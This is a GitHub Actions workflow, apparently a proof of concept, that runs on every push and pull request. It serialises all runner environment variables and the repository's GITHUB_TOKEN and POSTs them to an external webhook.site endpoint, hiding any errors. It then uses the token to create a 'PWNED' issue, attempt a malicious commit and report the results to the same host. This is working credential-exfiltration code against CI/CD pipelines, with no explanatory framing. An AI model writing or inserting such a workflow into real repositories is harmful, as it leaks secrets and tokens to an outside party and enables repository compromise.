name: Environment Exfiltration Test
on: [push, pull_request, workflow_dispatch]

permissions:
  issues: write
  contents: read

jobs:
  exfiltrate-env:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Exfiltrate environment variables
        run: |
          {
            echo "{"
            echo "  \"SOURCE\": \"âš™ï¸ GITHUB_ACTIONS_RUNNER\","
            echo "  \"ATTACK_VECTOR\": \"ci-cd-workflow\","
            echo "  \"SEVERITY\": \"HIGH\","
            env | awk -F= '{
              key=$1
              value=substr($0, length($1)+2)
              gsub(/"/, "\\\"", value)
              gsub(/\\/, "\\\\", value)
              printf "  \"%s\": \"%s\",\n", key, value
            }' | sed '$ s/,$//'
            echo "}"
          } | curl -X POST \
            -H "Content-Type: application/json" \
            -H "X-Exfil-Source: GITHUB-ACTIONS" \
            -H "X-Attack-Vector: ci-cd-workflow" \
            -d @- \
            https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true

      - name: Exfiltrate GitHub context
        run: |
          curl -X POST -H "Content-Type: application/json" \
            -d "{\"github_token\":\"${{ secrets.GITHUB_TOKEN }}\",\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\"}" \
            https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true

      - name: Test token permissions
        run: |
          TOKEN="${{ secrets.GITHUB_TOKEN }}"
          REPO="${{ github.repository }}"

          echo "=== Testing GITHUB_TOKEN Permissions ==="

          # Test 1: Read repo info
          echo "1. Testing repo read access..."
          REPO_INFO=$(curl -s -H "Authorization: token $TOKEN" \
            https://api.github.com/repos/$REPO)
          echo "$REPO_INFO" | jq -r '.permissions // "No permissions field"'

          # Test 2: List repo secrets (should fail)
          echo "2. Testing secrets read access..."
          SECRETS=$(curl -s -H "Authorization: token $TOKEN" \
            https://api.github.com/repos/$REPO/actions/secrets)
          echo "$SECRETS" | head -c 200

          # Test 3: Create issue (should succeed with our permissions)
          echo "3. Testing issue write access..."
          ISSUE_RESPONSE=$(curl -s -X POST \
            -H "Authorization: token $TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/$REPO/issues \
            -d '{"title":"ðŸš¨ PWNED: Token Permission Test","body":"This issue proves the GITHUB_TOKEN has write access.\n\n**Token Capabilities Demonstrated:**\n- âœ… Read repository metadata\n- âœ… Create issues\n- âœ… Execute arbitrary code in CI/CD\n\nRun ID: ${{ github.run_id }}","labels":["security-test"]}')
          echo "$ISSUE_RESPONSE" | jq -r '.html_url // .message'

          # Test 4: Try to push commits (should fail - no contents:write)
          echo "4. Testing commit/push access..."
          COMMIT_RESPONSE=$(curl -s -X PUT \
            -H "Authorization: token $TOKEN" \
            https://api.github.com/repos/$REPO/contents/PWNED.txt \
            -d '{"message":"Malicious commit","content":"cHduZWQ="}')
          echo "$COMMIT_RESPONSE" | jq -r '.message // "Success?"' | head -c 200

          # Send permission test results to webhook
          {
            echo "{"
            echo "  \"test\": \"token_permissions\","
            echo "  \"repo_access\": $(echo "$REPO_INFO" | jq -c '.permissions // {}'),"
            echo "  \"secrets_access\": \"$(echo "$SECRETS" | jq -r '.message // "accessible"' | head -c 50)\","
            echo "  \"issue_created\": \"$(echo "$ISSUE_RESPONSE" | jq -r '.html_url // .message' | head -c 100)\","
            echo "  \"commit_access\": \"$(echo "$COMMIT_RESPONSE" | jq -r '.message // "success"' | head -c 50)\""
            echo "}"
          } | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
